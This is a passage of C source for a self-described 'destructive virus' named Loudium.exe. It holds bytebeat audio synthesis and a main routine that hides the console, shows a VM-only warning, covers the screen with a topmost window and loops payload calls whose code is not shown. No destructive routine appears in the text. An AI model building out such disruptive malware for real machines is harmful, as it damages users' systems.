            raw = (unsigned int)((tt * (tt >> 5 | tt >> 8)) >> (tt >> 16));
            break;
        case 10: 
            {
                double a = (sin(880.0 * PI * dt + 1.0) * dt * 4.0 && (5.0 * dt)) / 8.0;
                raw = (unsigned int)(a + 5.0 * dt / 2.0);
            }
            break;
        case 11: 
            raw = (unsigned int)((tt >> 2) * (tt >> 6) ^ (tt + (tt >> 14)));
            break;
        case 12: 
            raw = (unsigned int)(tt * (tt >> 8) & (tt >> 3));
            break;
        case 13: 
            raw = (unsigned int)((tt * (tt >> 11 & tt >> 13)) ^ (tt >> 2));
            break;
        case 14: 
            raw = (unsigned int)((tt * (tt >> 9)) | (tt >> 3));
            break;
        case 15: 
            raw = (unsigned int)((tt >> 5 | tt >> 3) * (tt >> 7));
            break;
        default: 
            raw = (unsigned int)(tt * (tt >> 8));
            break;
    }

    int centered = (int)(raw & 0xFF) - 128;
    centered = centered * 64;
    if (centered > 127) centered = 127;
    if (centered < -128) centered = -128;
    return (unsigned char)(centered + 128);
}

int GetSampleRateForId(int id) {
    if (id == 1) return 16000;
    if (id == 3) return 88200;
    if (id == 4) return 16000;
    if (id == 7) return 8000;
    if (id == 10) return 32000;
    return 11025;
}

DWORD WINAPI BytebeatThreadProc(LPVOID lpParam) {
    HWAVEOUT hWaveOut = NULL;
    char buffers[NUM_BUFFERS][AUDIO_BUFFER_SIZE];
    WAVEHDR headers[NUM_BUFFERS];

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    int current_buf = 0;
    int last_id = -1;

    while (run_bytebeat) {
        if (current_bytebeat_id != last_tracked_bytebeat_id) {
            global_t = 0;
            last_tracked_bytebeat_id = current_bytebeat_id;
        }

        int target_rate = GetSampleRateForId(current_bytebeat_id);

        if (current_bytebeat_id != last_id) {
            if (hWaveOut) {
                waveOutReset(hWaveOut);
                for (int i = 0; i < NUM_BUFFERS; i++) waveOutUnprepareHeader(hWaveOut, &headers[i], sizeof(WAVEHDR));
                waveOutClose(hWaveOut);
                hWaveOut = NULL;
            }
            last_id = current_bytebeat_id;

            WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)target_rate, (DWORD)target_rate, 1, 8, 0 };
            if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) return 0;

            for (int i = 0; i < NUM_BUFFERS; i++) {
                memset(&headers[i], 0, sizeof(WAVEHDR));
                headers[i].lpData = buffers[i];
                headers[i].dwBufferLength = AUDIO_BUFFER_SIZE;
                for (int j = 0; j < AUDIO_BUFFER_SIZE; j++) {
                    buffers[i][j] = (char)GetBytebeatSample(current_bytebeat_id, global_t++);
                }
                waveOutPrepareHeader(hWaveOut, &headers[i], sizeof(WAVEHDR));
                waveOutWrite(hWaveOut, &headers[i], sizeof(WAVEHDR));
            }
            current_buf = 0;
        }

        WAVEHDR* hdr = &headers[current_buf];
        while (!(hdr->dwFlags & WHDR_DONE) && run_bytebeat && current_bytebeat_id == last_id) {
            Sleep(1);
        }
        if (!run_bytebeat) break;
        if (current_bytebeat_id != last_id) continue;

        waveOutUnprepareHeader(hWaveOut, hdr, sizeof(WAVEHDR));
        for (int i = 0; i < AUDIO_BUFFER_SIZE; i++) {
            buffers[current_buf][i] = (char)GetBytebeatSample(current_bytebeat_id, global_t++);
        }
        waveOutPrepareHeader(hWaveOut, hdr, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, hdr, sizeof(WAVEHDR));

        current_buf = (current_buf + 1) % NUM_BUFFERS;
    }

    if (hWaveOut) {
        waveOutReset(hWaveOut);
        for (int i = 0; i < NUM_BUFFERS; i++) waveOutUnprepareHeader(hWaveOut, &headers[i], sizeof(WAVEHDR));
        waveOutClose(hWaveOut);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HWND hwndConsole = GetConsoleWindow();
    if (hwndConsole != NULL) ShowWindow(hwndConsole, SW_HIDE);

    int msg1 = MessageBoxW(NULL, 
        L"THIS IS DESTRUCTIVE VIRUS BROOO, IF U TEST IN VMVARE, VIRTUALBOX, WINDOWS SANDBOX, HYPER-V, APPONFLY\n"
        L"YOUR PC SURVIVE, IF YOU TEST IN REAL PC, YOUR PC KILLED\n"
        L"dont test in real pc", 
        L"Loudium.exe", 
        MB_ICONWARNING | MB_OKCANCEL);

    if (msg1 == IDCANCEL) {
        return 0;
    }

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    // Окно создано БЕЗ WS_EX_LAYERED, чтобы GDI-эффекты и 3D-графика отображались корректно
    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST,
        L"STATIC", NULL,
        WS_POPUP | WS_VISIBLE,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    HDC hdc = GetDC(hwnd);

    HANDLE hAudioThread = CreateThread(NULL, 0, BytebeatThreadProc, NULL, 0, NULL);

    DWORD start_time = GetTickCount();
    while (1) {
        DWORD elapsed = GetTickCount() - start_time;
        int calculated_id = (int)(elapsed / 30000) + 1;
        current_bytebeat_id = calculated_id;

        RunPayloadForId(hdc, current_bytebeat_id, w, h, global_ticker);

        Sleep(15);
    }

    run_bytebeat = 0;
    WaitForSingleObject(hAudioThread, 1000);
    ReleaseDC(hwnd, hdc);
    return 0;
}